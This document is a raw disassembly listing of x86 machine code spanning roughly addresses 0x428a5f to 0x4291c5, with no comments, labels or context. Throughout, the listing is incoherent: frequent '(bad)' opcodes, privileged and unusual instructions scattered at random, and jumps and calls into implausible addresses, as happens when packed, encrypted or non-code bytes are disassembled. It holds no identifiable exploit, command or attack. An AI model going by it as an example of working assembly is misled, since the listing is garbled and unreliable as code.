  428a5f:	add    BYTE PTR [edi],cl
  428a61:	mov    edi,DWORD PTR [ecx-0x78]
  428a64:	ltr    WORD PTR [ecx-0x7b]
  428a68:	dec    DWORD PTR [edi]
  428a6a:	clc    
  428a6b:	out    0x45,eax
  428a6d:	add    BYTE PTR [eax],cl
  428a6f:	cmp    ebx,0xffffff8c
  428a72:	jge    0x428a74
  428a74:	jb     0x428a86
  428a76:	je     0x518af6
  428a7c:	pop    edx
  428a7d:	push   esi
  428a7e:	mov    ecx,DWORD PTR [edi]
  428a80:	in     al,dx
  428a81:	rol    DWORD PTR [ebp+0x0],1
  428a84:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  428a8b:	cmp    DWORD PTR [ecx],0xfffffff0
  428a8e:	hlt    
  428a8f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428a95:	(bad)  
  428a97:	push   eax
  428a98:	jns    0xb8426f16
  428a9e:	lock push cs
  428aa0:	ror    edx,0x3
  428aa3:	test   BYTE PTR [ecx+0x5500e800],cl
  428aa9:	dec    eax
  428aaa:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  428aae:	(bad)  
  428aaf:	mov    esi,0x7f33ff5f
  428ab4:	inc    eax
  428ab5:	test   DWORD PTR [edx],eax
  428ab7:	je     0x428a79
  428ab9:	mov    ecx,ecx
  428abb:	adc    DWORD PTR [ebp-0xc],0xffffffec
  428abf:	and    eax,DWORD PTR [eax+0xf0103]
  428ac5:	jp     0x428ab3
  428ac7:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  428acb:	add    edx,DWORD PTR [edi+0x74]
  428ace:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428ad4:	add    BYTE PTR [ebp-0x74c48bbb],al
  428ada:	je     0x428a5f
  428adc:	cmp    eax,edi
  428ade:	js     0x428b03
  428ae0:	add    eax,0xeb0fc003
  428ae5:	jns    0x428a72
  428ae7:	vmread DWORD PTR [ecx+0x45],ebx
  428aeb:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428af1:	adc    al,0x8b
  428af3:	jge    0x428b09
  428af5:	mov    edi,DWORD PTR [eax-0x4]
  428af8:	add    edi,DWORD PTR [edi]
  428afa:	or     bh,bh
  428afc:	push   ebp
  428afd:	push   es
  428afe:	mov    DWORD PTR [ebp-0x4],ebx
  428b01:	add    edi,esi
  428b03:	pop    es
  428b04:	add    esi,DWORD PTR [edi-0x48ccf183]
  428b0a:	mov    DWORD PTR [esp+esi*8],ecx
  428b0d:	inc    ebp
  428b0e:	pop    ebp
  428b0f:	xor    DWORD PTR [esi-0x4],0x3b
  428b13:	add    edx,DWORD PTR [ecx+edi*1]
  428b16:	push   es
  428b17:	clc    
  428b18:	mov    bh,0xdb
  428b1a:	jp     0x428ad3
  428b1c:	add    cl,BYTE PTR [esi]
  428b1e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428b24:	test   edi,edi
  428b26:	je     0x428b1c
  428b28:	mov    eax,ecx
  428b2a:	or     BYTE PTR [ebx],al
  428b2c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428b32:	jbe    0x428ba6
  428b34:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  428b3a:	add    ecx,DWORD PTR [esi]
  428b3c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  428b42:	add    eax,DWORD PTR [ebx-0x287af783]
  428b48:	je     0x428b97
  428b4a:	mov    DWORD PTR [ecx],edi
  428b4c:	mov    esi,eax
  428b4e:	hlt    
  428b4f:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  428b56:	jb     0x428b18
  428b58:	jmp    0x428b45
  428b5a:	xor    esi,DWORD PTR [ebx]
  428b5c:	pop    edi
  428b5d:	pop    esi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	ret    0x8b
  428b63:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  428b69:	cmp    DWORD PTR [eax],0xc
  428b6c:	pushf  
  428b6d:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  428b73:	(bad)  
  428b75:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
